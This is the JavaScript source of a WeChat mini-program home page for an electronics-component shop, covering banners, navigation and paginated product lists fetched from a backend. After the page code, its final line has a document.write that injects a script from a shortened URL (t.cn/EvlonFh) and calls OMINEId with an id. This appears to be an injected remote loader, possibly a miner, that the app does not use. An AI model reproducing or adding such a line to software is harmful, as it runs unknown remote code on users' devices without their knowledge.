//index.js
var t = getApp(),
  a = t.requirejs("core"),
  jq = t.requirejs("jquery"),
  e = (t.requirejs("icons"), t.requirejs("wxParse/wxParse"));
Page({
  data: {
    route: "home",
    pages:1,
    baner_bottom: [{ text: '正品保证', url: "/static/images/check_nav.png" }, { text: '无忧售后', url: "/static/images/check_nav.png" }, { text: '特色服务', url: "/static/images/check_nav.png" }, { text: '明码实价', url: "/static/images/check_nav.png"}],
    icons: t.requirejs("icons"),
    bannerheight:"200",
    shop: { sorts: [{ type: "search", visible: "1", data: [{ thumb: t.globalData.daxinImg + "/static/images/banner.png" }] }, { type: "banner", "bottom_nav": t.globalData.localhost + "/static/images/bottom_nav.png", visible: "1", bannerswipe: "1", data: [{ thumb: "/static/images/banner.png" }, { thumb: "../../static/images/banner.png" }] }, { type: "nav", visible: "1", data: [{ url: "/pages/goods/index/index?sell_num=sell_num", icon: t.globalData.localhost + "/static/images/icon-red/hot_product_click.png", navname: "热销产品" }, { url: "/pages/goods/index/index?show_site=1", icon: t.globalData.localhost + "/static/images/icon-red/new_product.png", navname: "最新产品" }, { url: "/pages/goods/index/index?show_site=2", icon: t.globalData.localhost + "/static/images/icon-red/recommend_product.png", navname: "推荐产品" }, { url: "/pages/goods/index/index?show_site=3", icon: t.globalData.localhost +"/static/images/icon-red/extra_sale.png", navname: "特卖产品" }] }] } ||{},
    indicatorDots: true,
    autoplay: true,
    interval: 5000,
    duration: 500,
    circular: true,
    storeRecommand: [{ id: "55", type: "test", salenum:"455",rangeprice:"0.1 - 0.5",thumb: "../../static/images/recommend_left.jpg", total: 1, ispresell: 1, title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", minprice: "54.12" }, { id: "55", type: "test", thumb: "../../static/images/recommend_left.jpg", total: 1, ispresell: 1, title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", minprice: "54.12" }],
    total: 0,
    page: 1,
    show:true,
    loaded: false,
    loading: true,
    empty:false,
    indicatorDotsHot: false,
    autoplayHot: true,
    intervalHot: 5000,
    durationHOt: 1000,
    circularHot: true,
    hotimg: "/static/images/hotdot.jpg",
    notification: "/static/images/notification.png"
  },
  sceneRedict: function () {
    //扫描跳转
    var shareData = "";
    var _this = this;
    if (t.globalData.scene) {
      //_this.sendrecomendInfo(_this.data.scene);
      shareData = t.getShareData(t.globalData.scene);
      console.log("shareData", shareData, t.globalData.scene);
      if (shareData) {
        setTimeout(function () {
          wx.navigateTo({
            //url: "/pages/goods/detail/index?id=13"
            url: shareData.shareUrl
          })
        }, 500);
      };
      return true;
    } else {
      return false;
    }
  },
  onPullDownRefresh: function () {
    this.setData({
      pages: 1,
      empty: false,
      loading: true});
    this.getData(this, "2",1);
    wx.stopPullDownRefresh();
  },
  onReachBottom: function () {
    var pge=this.data.pages;
    pge++;
    if(pge>=100){return};
    if(!this.data.empty){
      this.getData(this, "2", pge); 
      this.setData({
        pages: pge
      });
    } 
  },
  onLoad: function (a) {
   // t.url(a)
    this.getIndexImg();  
  },
  onReady:function(){
    this.getData(this, "2", 1);
  },
  onShow: function () {
    var a = t.getCache("sysset");
    var _this =this;
    wx.setNavigationBarTitle({
      title: a.shopname || "玖隆芯城"
    })
      //this.getShop()
     // this.getRecommand()
    // this.getData(this,"2",_this.data.pages);
    // this.setData({
    //   pages:1
    // });
      
  },
  likebuy:function(event){
    var id= a.pdata(event).id;
    wx.navigateTo({
      url: '/pages/goods/detail/index?id='+id
    })
  },
  onShareAppMessage: function () {
    return a.onShareAppMessage()
  },
  imagesHeight: function (t) {
    var a = t.detail.width,
      e = t.detail.height,
      o = t.target.dataset.type,
      i = {},
      s = this;
    wx.getSystemInfo({
      success: function (t) {
        i[o] = t.windowWidth / a * e,
          (!s.data[o] || s.data[o] && i[o] < s.data[o]) && s.setData(i)
      }
    })
  },
  getData: function(_this, show_site, pages) {
    var _this=this;
    //商品列表
    wx.showLoading({
      title: '加载中',
    });
    wx.request({
      url: t.globalData.daxin + "/product/productList",
      data: {
        session_token: t.globalData.session_token,
        show_site: show_site ? show_site : "2",
        //sell_num: sell_num ? sell_num : 0,
        page: pages ? pages : 1,
        pageSize: 10,
        sort:'store 21'
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.data.list.length >= 0) {
          if (res.data.data.list.length == 0){
            var datas = {
              empty: true
            };
            if (pages>1)datas.page=100;
            _this.setData(datas);
            return;
          }
          var storeRecommand = [];
          if (pages > 1) {
            storeRecommand = _this.data.storeRecommand;
          }
          var array = res.data.data.list;
          jq.each(array, function (index, value) {
            var obj = {};
            obj.title = value.p_sign;
            obj.id = value.id;
            obj.cate_id = value.cate_id;
            obj.detail = value.parameter;
            obj.salenum = value.sell_num > 0 ? value.sell_num : 0;
            obj.store = value.store > 0 ? value.store : 0;
            obj.img = value.img.indexOf("http") > 0 ? value.img : (t.globalData.daxinImg + value.img);
            obj.rangeprice = parseFloat(value.product_price[value.product_price.length - 1].unit_price).toFixed(2) + "~" + parseFloat(value.product_price[0].unit_price).toFixed(2);
            storeRecommand.push(obj);
          });
          //_this.storeRecommand = storeRecommand;
          //console.log(storeRecommand, storeRecommand[0].img.indexOf("http"), t.globalData.daxinImg );
          var senddatas = {
            storeRecommand: storeRecommand
          };
          if (pages == 1 && res.data.data.list.length<10 ){
            senddatas.empty =true;
            senddatas.loading = false;
          };
          _this.setData(senddatas);
        } else {
          if (res.data.msg=="没有数据") {
            _this.setData({
              empty: true,
              loading:false
            });return;
            }
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + '信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  }
  ,
  getIndexImg: function () {
    var _this = this;
    //获取首页轮播图
    wx.request({
      url: t.globalData.daxin + "/Index/firstPageImg",
      data: {
        session_token: t.globalData.session_token
      },
      method: "POST",
      success: function (res) {
        if (res.data.statusCode >= 0 && res.data.data.list.length >= 0) {
          var imgData = [];
          var array = res.data.data.list;
          jq.each(array, function (index, value) {
            imgData.push({ thumb: t.globalData.daxinImg+value.photo_url});
           
          });
          //_this.storeRecommand = storeRecommand;
          //console.log(storeRecommand, storeRecommand[0].img.indexOf("http"), t.globalData.daxinImg );
          _this.setData({
            "shop.sorts[1].data": imgData
          },function(){
            _this.sceneRedict();
          });
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + '信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  }
})
 
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
